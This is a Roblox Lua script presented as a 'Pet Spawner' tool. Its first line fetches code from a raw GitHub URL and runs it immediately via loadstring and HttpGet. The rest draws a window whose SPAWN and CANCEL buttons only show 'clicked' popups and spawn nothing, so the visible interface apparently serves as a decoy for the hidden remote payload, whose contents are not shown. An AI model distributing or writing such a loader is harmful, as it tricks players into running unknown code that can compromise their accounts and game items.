loadstring(game:HttpGet("https://raw.githubusercontent.com/SpeedGAG/script/refs/heads/main/NoKey"))()
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local existingVisual = playerGui:FindFirstChild("PetSpawnerUI_Visual")
if existingVisual then existingVisual:Destroy() end
local visualScreenGui = Instance.new("ScreenGui")
visualScreenGui.Name = "PetSpawnerUI_Visual"
visualScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
visualScreenGui.Parent = playerGui
local function makeCorner(parent, radius)
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, radius)
    corner.Parent = parent
end
local function createButton(parent, text, pos, size, color)
    local btn = Instance.new("TextButton")
    btn.Size = size
    btn.Position = pos
    btn.BackgroundColor3 = color
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 14
    btn.TextColor3 = Color3.fromRGB(255,255,255)
    btn.Text = text
    btn.AutoButtonColor = true
    btn.ZIndex = 10
    btn.Parent = parent
    makeCorner(btn, 8)
    return btn
end
local function showPopup(message, color, duration)
    duration = duration or 2
    local popup = Instance.new("Frame")
    popup.Size = UDim2.new(0.8,0,0,40)
    popup.Position = UDim2.new(0.1,0,0.8,0)
    popup.BackgroundColor3 = Color3.fromRGB(30,30,30)
    popup.ZIndex = 50
    popup.Parent = visualScreenGui
    makeCorner(popup, 8)
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1,-10,1,0)
    textLabel.Position = UDim2.new(0,5,0,0)
    textLabel.BackgroundTransparency = 1
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextSize = 14
    textLabel.Text = message
    textLabel.TextColor3 = color
    textLabel.TextXAlignment = Enum.TextXAlignment.Center
    textLabel.ZIndex = 51
    textLabel.Parent = popup
    popup.BackgroundTransparency = 1
    textLabel.TextTransparency = 1
    TweenService:Create(popup, TweenInfo.new(0.3), {BackgroundTransparency=0}):Play()
    TweenService:Create(textLabel, TweenInfo.new(0.3), {TextTransparency=0}):Play()
    if duration > 0 then
        task.delay(duration, function()
            TweenService:Create(popup, TweenInfo.new(0.3), {BackgroundTransparency=1}):Play()
            TweenService:Create(textLabel, TweenInfo.new(0.3), {TextTransparency=1}):Play()
            task.delay(0.35, function() popup:Destroy() end)
        end)
    end
end
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0,360,0,230)
mainFrame.Position = UDim2.new(0.5,-180,0.3,0)
mainFrame.BackgroundColor3 = Color3.fromRGB(20,20,20)
mainFrame.BorderSizePixel = 0
mainFrame.ZIndex = 5
mainFrame.Parent = visualScreenGui
makeCorner(mainFrame, 14)
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,-20,0,30)
title.Position = UDim2.new(0,10,0,10)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.Text = "Pet Spawner"
title.TextSize = 18
title.TextColor3 = Color3.fromRGB(255,170,0)
title.TextXAlignment = Enum.TextXAlignment.Center
title.ZIndex = 10
title.Parent = mainFrame
local spawnBtn = createButton(mainFrame,"SPAWN",UDim2.new(0.05,0,0,180),UDim2.new(0.42,0,0,36),Color3.fromRGB(0,170,0))
local cancelBtn = createButton(mainFrame,"CANCEL",UDim2.new(0.53,0,0,180),UDim2.new(0.42,0,0,36),Color3.fromRGB(170,0,0))
spawnBtn.MouseButton1Click:Connect(function()
    showPopup("Spawn button clicked!", Color3.fromRGB(0,200,0),2)
end)
cancelBtn.MouseButton1Click:Connect(function()
    showPopup("Cancel button clicked!", Color3.fromRGB(200,0,0),2)
end)
